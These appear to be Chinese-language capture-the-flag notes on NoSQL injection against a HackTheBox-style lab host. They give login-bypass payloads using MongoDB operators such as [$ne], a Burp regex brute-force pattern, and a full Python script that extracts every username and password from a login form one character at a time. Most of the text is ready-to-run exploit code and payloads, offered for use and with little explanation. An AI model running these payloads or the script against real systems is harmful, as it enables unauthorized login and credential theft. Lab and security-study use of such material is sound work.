https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#exploits

**绕过登录**
原 :  username=qwe&password=qwe&login=login
注 :  username[$ne]=qwe&password[$ne]=qwe&login=login
[$ne] , 不等于

https://github.com/C4l1b4n/NoSQL-Attack-Suite
```python
./nosql-login-bypass.py -t http://staging-order.mango.htb -u username -p password -o "login=login"
```

- 基本绕过尝试
```sql
username=admin&password[]=
```


**爆破凭据** 
- 使用 burpsuite，选中 `&data&` , a-Z 爆破
```
username[$regex]=^&data&.*&password[$ne]=qwe&login=login
```

- 使用 python 脚本爆破
https://github.com/youngowl13/nosqli-exploit/blob/master/nosqli.py
```python
import requests
import string

url = "http://staging-order.mango.htb/" #enter the url #enter the url
headers = {"Host": "staging-order.mango.htb"} #enter the host value
cookies = {"PHPSESSID": "gb181u8ebi4pavukj9ualeiot2"} #enter cookies

possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"",
"login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers,
cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]: 
           print("Found password "+password[1:].replace("\\",
"")+" for username "+username)
           return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*",
"login": "login"}
    for c in possible_chars: 
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers,
cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params,
headers=headers, cookies=cookies, verify=False,
allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break
                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)
```

